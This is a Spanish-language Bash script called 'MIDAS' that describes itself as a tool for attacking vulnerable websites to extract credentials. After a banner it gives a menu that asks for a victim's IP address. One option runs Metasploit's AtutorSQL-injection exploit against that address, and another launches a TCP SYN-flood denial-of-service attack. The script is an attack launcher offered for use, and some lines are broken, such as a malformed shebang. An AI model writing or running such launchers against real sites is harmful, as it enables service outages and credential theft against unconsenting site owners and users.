#2/bin/bash
#Proyecto M.I.D.A.S 
#Ilia
echo -e "\e[1;20m MMMMMMMM            MMMMMMMMM\e[0m"
echo -e "\e[1;20m MMMMMMMMMM        MMMMMMMMMMM\e[0m"
echo -e "\e[1;20m MMM   MMMMMMM   MMMMMMM   MMM\e[0m"
echo -e "\e[1;20m MMM       MMMMMMMMM       MMM\e[0m"
echo -e "\e[1;20m MMM         MMMMM         MMM\e[0m"
echo -e "\e[1;20m MMM          MMM          MMM\e[0m"
echo -e "\e[1;20m MMM           M           MMM\e[0m"
echo -e "\e[1;20m MMM                       MMM\e[0m"
echo -e "\e[1;20m MMM                       MMM\e[0m"
echo -e "\e[1;20m MMM                       MMM\e[0m"
echo -e "\e[1;20m MMM                       MMM\e[0m"
echo -e "\e[1;20m MMM                       MMM\e[0m"

echo -e "\e[1;33m MIDAS es un proyecto hecho para atacar paginas webs con defectos o vulnerabilidades que contiene dos herramientas : injeccion SQL y tambien hace ataques de DOS para facilitar el trabajo de extracion de credenciales de una web \e[0m"
sleep 5s
echo -e "\e[1;33m Espero que les guste mi trabajo \e[0m"
sleep 5s
        echo -e "\e[1;33m             
M  I     D  A  S
e  n  a  o  a  y
t  j  n  s  t  s
a  e  d     a  t
s  c        c  e
p  t           m
l  i 
o  o 
i  n 
t                 \e[0m"                                                       

sleep 10s


trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO \e[0m"
    sleep 2s
    clear
    exit 0
}

clear
sleep 2s
while :
do 
opcion=0
echo
echo -e "\e[1;33m   [1]\e[0m \e[1;34mSQL INJECTION\e[0m"
echo -e "\e[1;33m   [2]\e[0m \e[1;34mDOS ATACK\e[0m"
echo -e "\e[1;33m   [3]\e[0m \e[1;34mSALIR\e[0m"
read opcion
case $opcion in 



1)
sleep 2.5s 
echo -n -e "\e[1;33mDIRECCION IP DE LA WEB DE LA VICTIMA :\e[0m"
read IP
sleep 1s 
sudo service postgresql start
sleep 1s 
clear
sleep 2s
msfconsole -x "exploit/multi/http/atutor_sqli;\
                set RHOSTS $IP;\
                exploit"


read enterkey
;;
2)
sleep 2.5s 
echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
read IP
sleep 1s 
sudo service postgresql start
sleep 1s 
clear
sleep 2s
msfconsole -x "use /auxiliary/dos/tcp/synflood;\
                set RHOSTS $IP;\
                exploit"


read enterkey
;;
3)
clear
exit 0
read enterkey
;;
*)
clear
echo -e "\e[1;37mLa opcion\e[0m \e[1;33m[$opcion]\e[0m \e[1;37mno esta en la lista\e[0m \e[1;31m:(\e[0m"
read enterkey
;;
esac

echo "Gracias por usar MIDAS"
sleep 4s
done

